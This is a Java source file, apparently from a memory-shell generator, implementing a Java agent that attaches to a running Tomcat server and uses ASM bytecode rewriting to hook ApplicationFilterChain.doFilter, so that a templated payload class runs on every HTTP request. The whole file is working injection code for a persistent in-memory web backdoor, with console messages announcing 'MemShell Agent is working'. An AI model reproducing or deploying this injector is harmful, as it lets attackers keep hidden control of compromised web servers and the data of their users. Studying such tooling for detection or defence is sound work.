package com.reajason.javaweb.memshell.injector.tomcat;

import org.objectweb.asm.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Constructor;
import java.security.ProtectionDomain;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class TomcatFilterChainAgentWithAsmInjector implements ClassFileTransformer {
    private static final String TARGET_CLASS = "org/apache/catalina/core/ApplicationFilterChain";
    private static final String TARGET_METHOD_NAME = "doFilter";

    static Constructor<?> constructor = null;

    static {
        try {
            Class<?> clazz = Class.forName(getClassName());
            constructor = clazz.getConstructors()[0];
            constructor.setAccessible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public TomcatFilterChainAgentWithAsmInjector() {
    }

    @Override
    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className)) {
            try {
                ClassReader cr = new ClassReader(bytes);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
                    @Override
                    protected ClassLoader getClassLoader() {
                        return loader;
                    }
                };
                ClassVisitor cv = getClassVisitor(cw);
                cr.accept(cv, ClassReader.EXPAND_FRAMES);
                return cw.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
        return new ClassVisitor(Opcodes.ASM9, cv) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if (TARGET_METHOD_NAME.equals(name)) {
                    try {
                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
                        return (MethodVisitor) constructor.newInstance(mv, argumentTypes);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return mv;
            }
        };
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        inst.addTransformer(new TomcatFilterChainAgentWithAsmInjector(), true);
        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
            String name = allLoadedClass.getName();
            if (TARGET_CLASS.replace("/", ".").equals(name)) {
                inst.retransformClasses(allLoadedClass);
            }
        }
        System.out.println("MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter");
    }
}
